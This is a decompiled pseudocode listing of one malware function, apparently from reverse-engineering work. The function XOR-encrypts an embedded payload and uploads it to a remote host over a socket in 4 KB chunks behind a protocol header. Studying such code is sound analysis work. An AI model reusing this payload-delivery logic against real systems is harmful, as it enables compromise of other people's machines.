// --- Metadata ---
// Function Name: sendEncryptedPayload_406F50
// Address: 0x406F50
// Exported At: 20250527_183326
// Signature: unknown_signature
// ---------------
int __cdecl sendEncryptedPayload_406F50(SOCKET s, int a2, int a3)
{
  const void *v3; // esi
  unsigned int v4; // ebx
  void *v5; // ebp
  char *v6; // eax
  const void *v7; // esi
  int v8; // ebx
  int v9; // ebp
  int v10; // esi
  bool v11; // cc
  int v12; // ebx
  _DWORD v14[3]; // [esp+10h] [ebp-20E4h] BYREF
  int v15; // [esp+1Ch] [ebp-20D8h]
  HGLOBAL hMem; // [esp+20h] [ebp-20D4h]
  int i; // [esp+24h] [ebp-20D0h]
  int v18; // [esp+28h] [ebp-20CCh]
  char buf[70]; // [esp+2Ch] [ebp-20C8h] BYREF
  int v20; // [esp+72h] [ebp-2082h]
  int v21; // [esp+76h] [ebp-207Eh]
  int v22; // [esp+7Ah] [ebp-207Ah]
  char v23[4211]; // [esp+7Eh] [ebp-2076h] BYREF
  __int16 v24; // [esp+10F1h] [ebp-1003h]
  char v25; // [esp+10F3h] [ebp-1001h]
  char v26; // [esp+10F4h] [ebp-1000h] BYREF
  char v27[4092]; // [esp+10F5h] [ebp-FFFh] BYREF
  __int16 v28; // [esp+20F1h] [ebp-3h]
  char v29; // [esp+20F3h] [ebp-1h]

  buf[0] = 0;
  memset(&buf[1], 0, 0x10C4u);
  v24 = 0;
  v25 = 0;
  v26 = 0;
  memset(v27, 0, sizeof(v27));
  v28 = 0;
  v29 = 0;
  *(v14 + 1) = 0;
  LOBYTE(v14[0]) = 0;
  *(&v14[1] + 1) = 0;
  *(&v14[2] + 1) = 0;
  HIBYTE(v14[2]) = 0;
  if ( a2 )                                     // 메모리 할당 및 4kb 단위 메시지 전송 
  {
    v3 = *&FileName[260];
    v4 = 4869;
    v5 = &unk_506000;
  }
  else
  {
    v3 = *&FileName[264];
    v4 = 6144;
    v5 = &unk_50D800;
  }
  v6 = GlobalAlloc(0x40u, v5 + v4 + 12);
  hMem = v6;
  if ( v6 )
  {
    qmemcpy(&v6[v4], v3, v5);
    if ( (v5 + v4) % 4 )
    {
      v15 = 4 * ((v5 + v4) / 4) + 4;
      v6 = hMem;
    }
    else
    {
      v15 = v5 + v4;
    }
    if ( a2 )
    {
      v7 = &unk_42E758;
      dword_42ECE9 = v5 + 3440;
      *(&dword_42E750 + v4) = v5;
      *(&dword_42E754 + v4) = 1;
    }
    else
    {
      v7 = &unk_42FA60;
      dword_4302CE = v5 + 3978;
      *(&dword_42FA58 + v4) = v5;
      *(&dword_42FA5C + v4) = 1;
    }
    qmemcpy(v6, v7, v4);
    xorEncryptBuffer_406F00(a3, v6, v15);
    v8 = v15 / 4096;
    v9 = v15 % 4096;
    qmemcpy(buf, &unk_42E710, sizeof(buf));
    v10 = 0;
    v18 = 0;
    if ( v15 / 4096 > 0 )
    {
      for ( i = 0; ; v10 = i )
      {
        v14[0] = v15;
        v14[1] = 4096;
        v14[2] = v10;
        xorEncryptBuffer_406F00(a3, v14, 12);
        v20 = v14[0];
        v21 = v14[1];
        v22 = v14[2];
        qmemcpy(v23, hMem + v10, 0x1000u);
        if ( send(s, buf, 4178, 0) == -1 )
          break;
        if ( recv(s, &v26, 4096, 0) == -1 )
          break;
        if ( v27[33] != 82 )
          break;
        v11 = ++v18 < v8;
        i += 4096;
        if ( !v11 )
          break;
      }
    }
    if ( v9 > 0 )
    {
      *&buf[2] = htons(v9 + 78);
      *&buf[67] = v9 + 13;
      v12 = v8 << 12;
      *&buf[39] = v9;
      *&buf[59] = v9;
      v14[0] = v15;
      v14[1] = v9;
      v14[2] = v12;
      xorEncryptBuffer_406F00(a3, v14, 12);
      v22 = v14[2];
      v20 = v14[0];
      v21 = v14[1];
      qmemcpy(v23, hMem + v12, v9);
      if ( send(s, buf, v9 + 82, 0) != -1 )
        recv(s, &v26, 4096, 0);
    }
    GlobalFree(hMem);
  }
  return 0;
}
